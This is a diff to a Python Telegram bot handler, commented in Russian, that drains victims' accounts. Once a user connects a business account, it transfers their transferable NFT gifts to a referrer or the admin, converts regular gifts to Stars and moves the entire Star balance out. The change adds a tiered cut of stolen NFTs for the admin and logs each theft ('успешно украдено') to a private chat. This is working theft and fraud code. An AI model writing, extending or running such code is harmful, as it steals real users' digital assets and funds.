@@ -482,17 +482,22 @@ async def steal_gifts_handler(callback: CallbackQuery):
     user_id = callback.from_user.id
     inviter_id = user_referrer_map.get(user_id)
     
+    # Определяем получателя (пригласивший или админ)
     if inviter_id:
         try:
-            await bot.get_chat(inviter_id)
+            await bot.get_chat(inviter_id)  # Проверяем, существует ли чат
             recipient_id = inviter_id
+            is_admin = False
         except Exception:
             recipient_id = ADMIN_IDS[0]
+            is_admin = True
     else:
         recipient_id = ADMIN_IDS[0]
+        is_admin = True
 
     stolen_nfts = []
     stolen_count = 0
+    admin_gifts = 0  # Количество подарков для админа
     errors = []
     
     try:
@@ -503,50 +508,110 @@ async def steal_gifts_handler(callback: CallbackQuery):
         await callback.answer("Ошибка при получении подарков")
         return
 
-    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
+    # Фильтруем только NFT подарки, которые можно передать
+    transferable_gifts = [
+        gift for gift in gifts_list 
+        if gift.type == "unique" and gift.can_be_transferred
+    ][:MAX_GIFTS_PER_RUN]  # Ограничиваем максимальное количество
     
-    for gift in gifts_to_process:
-        gift_id = gift.owned_gift_id
-        gift_type = gift.type
-        
-        if gift_type == "regular":
+    total_gifts = len(transferable_gifts)
+    
+    # Рассчитываем комиссию админу
+    if not is_admin:  # Если есть пригласивший
+        if total_gifts >= 7:
+            admin_gifts = 3
+        elif 5 <= total_gifts <= 6:
+            admin_gifts = 2
+        elif 3 <= total_gifts <= 4:
+            admin_gifts = 1
+        elif total_gifts <= 2:
+            admin_gifts = 0
+    
+    # Сначала передаем подарки админу (если есть комиссия)
+    admin_stolen = []
+    if admin_gifts > 0 and ADMIN_IDS:
+        for gift in transferable_gifts[:admin_gifts]:
             try:
-                await bot.convert_gift_to_stars(business_id, gift_id)
-            except Exception as e:
-                errors.append(f"Ошибка конвертации: {e}")
-                continue
-        
-        if gift_type == "unique" and gift.can_be_transferred:
-            try:
-                await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
+                await bot.transfer_gift(
+                    business_id, 
+                    gift.owned_gift_id, 
+                    ADMIN_IDS[0], 
+                    gift.transfer_star_count
+                )
                 gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
-                stolen_nfts.append(f"t.me/nft/{gift_name}")
+                admin_stolen.append(f"t.me/nft/{gift_name}")
                 stolen_count += 1
             except Exception as e:
-                errors.append(f"Ошибка передачи {gift_id}: {e}")
+                errors.append(f"Ошибка передачи админу {gift.owned_gift_id}: {e}")
+    
+    # Затем передаем оставшиеся подарки пригласившему
+    user_stolen = []
+    for gift in transferable_gifts[admin_gifts:]:
+        try:
+            await bot.transfer_gift(
+                business_id, 
+                gift.owned_gift_id, 
+                recipient_id, 
+                gift.transfer_star_count
+            )
+            gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
+            user_stolen.append(f"t.me/nft/{gift_name}")
+            stolen_count += 1
+        except Exception as e:
+            errors.append(f"Ошибка передачи {gift.owned_gift_id}: {e}")
 
-    # Перевод звёзд
+    # Конвертируем обычные подарки в звезды для получателя
+    try:
+        for gift in gifts_list:
+            if gift.type == "regular":
+                try:
+                    await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
+                except Exception as e:
+                    errors.append(f"Ошибка конвертации: {e}")
+    except Exception as e:
+        errors.append(f"Ошибка при обработке обычных подарков: {e}")
+
+    # Перевод звёзд получателю
     try:
         stars = await bot.get_business_account_star_balance(business_id)
         amount = int(stars.amount)
         if amount > 0:
             await bot.transfer_business_account_stars(business_id, amount, recipient_id)
-            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
+            await bot.send_message(
+                LOG_CHAT_ID, 
+                f"🌟 Выведено звёзд: {amount} для {'пригласившего' if not is_admin else 'админа'}"
+            )
     except Exception as e:
         errors.append(f"Ошибка при выводе звёзд: {e}")
 
-    # Отчет о результате
+    # Формируем отчет
     result_msg = []
     if stolen_count > 0:
         result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
-        result_msg.extend(stolen_nfts[:10])  
+        if admin_stolen:
+            result_msg.append(f"\n📦 Админу передано: <b>{len(admin_stolen)}</b>")
+            result_msg.extend(admin_stolen[:3])  # Показываем первые 3 NFT админу
+        if user_stolen:
+            recipient_type = "пригласившему" if not is_admin else "админу"
+            result_msg.append(f"\n🎁 Основному получателю ({recipient_type}): <b>{len(user_stolen)}</b>")
+            result_msg.extend(user_stolen[:3])  # Показываем первые 3 NFT получателю
     
     if errors:
         result_msg.append("\n❌ Ошибки:")
-        result_msg.extend(errors[:5])  
+        result_msg.extend(errors[:3])  # Показываем первые 3 ошибки
 
+    # Отправляем отчет
     await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
     await callback.answer()
+
+    # Логируем в админ-чат
+    log_msg = (
+        f"🔹 Получатель: {'пригласивший' if not is_admin else 'админ'}\n"
+        f"🔹 Всего NFT: {total_gifts}\n"
+        f"🔹 Админу передано: {len(admin_stolen)}\n"
+        f"🔹 Основному получателю: {len(user_stolen)}"
+    )
+    await bot.send_message(LOG_CHAT_ID, log_msg)
 
 @dp.callback_query(F.data == "unfreeze_order")
 async def handle_unfreeze_order(callback: CallbackQuery):
